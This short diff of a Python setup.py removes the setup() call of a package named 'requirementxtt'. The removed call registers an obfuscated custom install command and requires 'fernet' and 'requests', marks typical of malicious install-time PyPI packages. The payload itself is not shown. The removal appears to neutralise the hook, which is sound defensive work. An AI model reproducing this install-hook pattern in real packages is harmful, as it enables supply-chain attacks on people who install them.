@@ -18,22 +18,5 @@ class eMNPwCUPLNQyTsEgOnslxlwpwPvIyymUBloFwEKVfGGxuVwBnWKPzaZBYwGPveexgWlqDmVLmr
             install.run(self)
 
 
-setup(
-    name="requirementxtt",
-    version=VERSION,
-    author="gMiSQHtiAVAcAtGeNLEu",
-    author_email="THeWJDjHXtEf@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': eMNPwCUPLNQyTsEgOnslxlwpwPvIyymUBloFwEKVfGGxuVwBnWKPzaZBYwGPveexgWlqDmVLmrwDhBmSWIObGpygEjELvHAXtXljtucvonFpDLtgKFCXGYCGnHZxkaaQiuQTpdtiQQDuAUEPrtDuhdwBVnthTuqAREJZQU,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
 
